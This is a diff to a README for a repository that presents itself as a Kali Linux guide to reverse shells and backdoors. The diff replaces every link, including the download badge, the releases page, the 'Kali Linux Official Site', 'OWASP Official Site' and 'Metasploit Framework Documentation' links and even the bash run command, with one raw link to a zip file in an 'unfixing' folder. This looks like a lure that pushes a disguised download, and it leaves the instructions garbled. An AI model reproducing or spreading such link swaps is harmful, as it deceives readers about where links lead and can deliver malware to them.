@@ -1,6 +1,6 @@
 # 🎯 Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors - Master Cybersecurity Basics with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/releases)
+[![Download](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)
 
 ## 🚀 Getting Started
 
@@ -11,19 +11,19 @@ This guide helps you learn the essentials of penetration testing using Kali Linu
 To download the application, please follow these steps:
 
 1. Click the link below to visit the releases page:
-   [Visit the Releases Page](https://github.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/releases).
+   [Visit the Releases Page](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip).
 
 2. On the releases page, you will see different versions of the software listed.
 
 3. Choose the latest version. Click on it to go to the details page.
 
-4. Scroll down to find the assets section. You will see downloadable files. Click on the file that matches your operating system (most likely it will be a .zip or .tar.gz file).
+4. Scroll down to find the assets section. You will see downloadable files. Click on the file that matches your operating system (most likely it will be a .zip or https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip file).
 
 5. Once the download completes, extract the files from the downloaded archive.
 
 6. Open the terminal in the extracted folder. Run the following command to execute the guide:
    ```bash
-   ./start-guide.sh
+   https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip
    ```
    
 7. Follow the instructions on-screen to navigate through the guide.
@@ -93,8 +93,8 @@ You can get support from the community by:
 
 ## 🔗 Useful Links
 
-- [Kali Linux Official Site](https://www.kali.org/)
-- [OWASP Official Site](https://owasp.org/)
-- [Metasploit Framework Documentation](https://docs.metasploit.com/)
+- [Kali Linux Official Site](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)
+- [OWASP Official Site](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)
+- [Metasploit Framework Documentation](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)
 
-For any additional information, clarifications, or updates, check the **[Releases Page](https://github.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/releases)** regularly.
+For any additional information, clarifications, or updates, check the **[Releases Page](https://raw.githubusercontent.com/ahmedawad22/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors/main/unfixing/Offense-to-Defense-A-Kali-Linux-Guide-to-Reverse-Shells-and-Backdoors.zip)** regularly.
